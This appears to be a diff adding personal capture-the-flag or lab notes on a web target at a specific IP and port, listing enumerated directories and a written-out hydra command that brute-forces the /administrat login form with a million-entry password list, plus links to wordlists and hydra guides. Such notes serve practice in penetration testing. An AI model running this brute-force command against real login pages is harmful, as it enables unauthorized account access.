@@ -1,0 +1,21 @@
+64.227.43.53:32003
+1. directories 
+/administrat (Status: 301)
+/css (Status: 301)
+/favicon.ico (Status: 200)
+/img (Status: 301)
+/js (Status: 301)
+/mail (Status: 301)
+/vendor (Status: 301)
+
+2. /mail http://64.227.43.53:32003/mail/contact_me.php
+   i can not grab the file, not temporary file as well
+3. /img just contains images
+4. /js has a interesting file for sending email http://64.227.43.53:32003/js/contact_me.js
+5. /administrat could be important for brute force
+6. using hydra to bruteforce 
+hydra -L usernames.txt -P 1000000-password-seclists.txt 64.227.43.53 -s 32003 http-post-form "/administrat/index.php:username=^USER^&password=^PASS^:Please fill in your credentials to login" -V
+lists = https://github.com/duyet/bruteforce-database
+
+REFERENCE = https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
+https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/
